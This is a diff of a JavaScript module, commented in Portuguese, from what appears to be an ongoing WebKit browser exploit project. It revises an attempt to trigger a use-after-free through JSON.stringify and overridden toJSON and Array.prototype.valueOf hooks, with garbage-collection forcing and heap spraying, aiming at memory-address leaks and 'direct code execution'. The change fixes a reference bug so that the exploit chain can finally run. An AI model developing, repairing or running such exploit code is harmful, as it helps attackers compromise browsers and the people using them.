@@ -1,22 +1,24 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R68 - UAF com JSON.stringify)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R69 - Correção de Referência)
 // =======================================================================================
-// AS ESTRATÉGIAS ANTERIORES FALHARAM EM ENGANAR O GC.
-// ESTA VERSÃO IMPLEMENTA UMA TÉCNICA DE UAF MUITO MAIS PODEROSA E COMPROVADA,
-// ABUSANDO DA LÓGICA INTERNA DO JSON.stringify PARA FORÇAR A CONFUSÃO DE TIPOS.
-// O OBJETIVO NÃO É MAIS VINCULAR OBJETOS, MAS SIM OBTER EXECUÇÃO DE CÓDIGO DIRETA.
+// O R68 falhou devido a um erro de referência (variável não definida), um erro meu.
+// ESTA VERSÃO CORRIGE a chamada da variável, permitindo que a estratégia
+// de UAF com JSON.stringify seja finalmente executada.
+// A lógica de exploração é a mesma do R68.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R68_JSON_UAF";
+// *** MUDANÇA R69: O nome do módulo foi atualizado ***
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R69_JSON_UAF";
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R68)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R69)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R68_JSON_UAF;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF com JSON.stringify (R68) ---`, "test");
+    // *** MUDANÇA R69: Corrigido o nome da variável para usar a constante exportada ***
+    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF com JSON.stringify (R69) ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let original_toJSON = Object.prototype.toJSON;
@@ -33,6 +35,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         Array.prototype.valueOf = function() {
             logS3("++++++++++++ PAYLOAD EXECUTADO! CONTROLE DE EXECUÇÃO OBTIDO! ++++++++++++", "vuln");
             window.pwned_success = true;
+            // Retorna um valor primitivo para o stringifier não reclamar
+            return "[object Array]"; 
         };
 
         const uaf_victim = { id: 'victim' };
@@ -54,6 +58,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                 }
                 logS3("    GC e Spray concluídos. O UAF deve ocorrer agora.", "warn");
             }
+            // Retorna um valor simples para o stringifier
             return this.id;
         };
 
